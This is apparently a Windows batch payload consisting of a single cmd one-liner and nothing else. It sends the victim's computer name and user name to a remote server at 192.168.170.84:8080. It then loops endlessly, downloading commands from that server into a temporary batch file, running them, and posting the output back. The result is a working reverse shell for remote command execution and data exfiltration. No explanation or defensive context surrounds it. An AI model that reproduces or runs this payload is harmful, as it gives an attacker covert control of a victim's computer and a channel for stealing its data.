@echo off&cmd /V:ON /C "SET ip=192.168.170.84:8080&&SET sid="Authorization: 9a7601-8882bc-bdaf99"&&SET protocol=http://&&curl !protocol!!ip!/9a7601/!COMPUTERNAME!/!USERNAME! -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8882bc -H !sid! > !temp!cmd.bat & type !temp!cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!cmd.bat > !tmp!out.txt 2>&1) & curl !protocol!!ip!/bdaf99 -X POST -H !sid! --data-binary @!temp!out.txt > NUL)) & timeout 1" > NUL
 
